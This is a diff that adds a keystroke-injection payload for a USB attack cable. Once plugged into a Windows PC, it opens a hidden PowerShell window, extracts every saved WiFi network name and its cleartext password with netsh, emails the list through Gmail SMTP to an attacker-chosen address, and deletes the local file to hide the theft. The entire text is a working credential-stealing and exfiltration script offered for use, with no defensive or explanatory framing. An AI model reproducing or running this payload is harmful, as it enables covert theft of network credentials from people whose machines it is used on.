@@ -1,0 +1,39 @@
+REM WiFi password emailer 
+REM RootJunky
+REM OMG Cable Payload
+REM This payload will grab all of the wifi SSID and passwords that this windows PC has connected to. 
+REM You will need a GMAIL account and with Less secure app access to be able to use this method.
+REM see link https://myaccount.google.com/lesssecureapps
+GUI r
+sleep 1
+STRING powershell -NoP -NonI -W Hidden
+ENTER
+Delay 500
+STRING (netsh wlan show profiles) | Select-String ":(.+)$" | % {$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | % {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File "$env:userprofile\Desktop\wifipasswd.txt"
+ENTER
+Delay 500
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $True
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("YOUR_GMAIL_ACCOUNT", "YOUR_GMAIL_PASSWORD")
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'YOUR_GMAIL_ACCOUNT'
+ENTER
+STRING $ReportEmail.To.Add('THE_EMAIL_ADDRESS_TO_SEND_WIFI_INFO_TO')
+ENTER
+STRING $ReportEmail.Subject = 'OMG WIFI Passwords'
+ENTER
+STRING $ReportEmail.Body = (Get-Content $env:userprofile\Desktop\wifipasswd.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+Delay 5000
+STRING del "Desktop\wifipasswd.txt"
+ENTER
+STRING exit
+ENTER
